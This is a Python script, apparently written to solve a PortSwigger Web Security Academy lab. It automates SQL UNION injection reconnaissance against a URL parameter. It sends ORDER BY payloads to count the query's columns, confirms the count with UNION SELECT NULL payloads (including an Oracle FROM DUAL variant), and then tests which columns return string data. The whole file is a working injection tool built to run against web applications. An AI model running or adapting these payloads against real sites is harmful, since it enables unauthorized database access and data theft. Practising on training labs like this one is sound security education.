import requests

##Function to generate NULL,NULL,NULL... string pattern
def nullgen(i):
    if i>0:
        st="NULL"
        for j in range(i-1):
            st+=", NULL"
        return st
    else:
        #print("Number of NULL is non positive")
        return ""


##Function to find number of columns required for SQL Union Injection attack        
def orderby(url,n):
    order = "' ORDER BY "
    i=1
    
    while i<n:
        
        inj=url+order+str(i)+"-- "
        print(inj)
        response = requests.get(inj)

        if response.status_code ==200:
            print(response.status_code)
            i += 1
            
            continue
        
        else:
            print(response.status_code)
            print("\n\n\nNo of columns found, using ORDER BY: ",i-1,"\n\n\n")

            res=union_verify(url,i-1)

            if res[0]==True:
                return [i-1,res[1]]
            else:
                break

##Function to verify the ORDER BY result   
def union_verify(url,n):
    inj=url+"' UNION SELECT "+nullgen(n)+"-- "
    print(inj)
    response = requests.get(inj)

    if response.status_code ==200:
        print("\n\nSuccess - Non Oracle")
        return [True,0]

    else:
        inj=url+"' UNION SELECT "+nullgen(n)+" FROM DUAL-- "
        print(inj)
        response2 = requests.get(inj)
        if response2.status_code==200:
            print("\n\nSuccess - Oracle")
            return [True,1]

    print("\n\nFailure using Union Select injection: \n",inj)
    return False



##Function to find the columns of useful datatype required for SQL Union Injection attack        
def union(url,col,oracle):
    print('\n\n\nChecking for Column with String Datatypes\n\n\n')
    string="'ABC'"
    valid_col=[]
    pre = url+"' UNION SELECT "

    for i in range(col):
        if i==0:
            if oracle==0:
                inj=pre+string+","+nullgen(col-i-1)+"-- "
            else:
                inj=pre+string+","+nullgen(col-i-1)+" FROM DUAL-- "

        elif i==col-1:
            if oracle==0:
                inj=pre+nullgen(i)+","+string+"-- "
            else:
                inj=pre+nullgen(i)+","+string+" FROM DUAL-- "
        else:
            if oracle==0:
                inj=pre+nullgen(i)+","+string+","+nullgen(col-i-1)+"-- "
            else:
                inj=pre+nullgen(i)+","+string+","+nullgen(col-i-1)+" FROM DUAL-- "
       
        print(inj)
        res=requests.get(inj)
        print(res.status_code)

        if res.status_code==200:
            valid_col.append(i+1)

    return valid_col
    


##Main() method
def main():
    
    url="https://example.com/filter?category=productid" ## Enter url here
    url="https://ac201fcd1f46e3d380b422a2007d0049.web-security-academy.net/filter?category=Pets"
    n=20   ## Number of columns
    
    columns,oracle=orderby(url,n)
    
    str_col=union(url,columns,oracle)

    print("\n\nColumns with string Data type are:")
    for i in str_col:
        print(i, end=" ")
        

if __name__=="__main__":
    main()
    
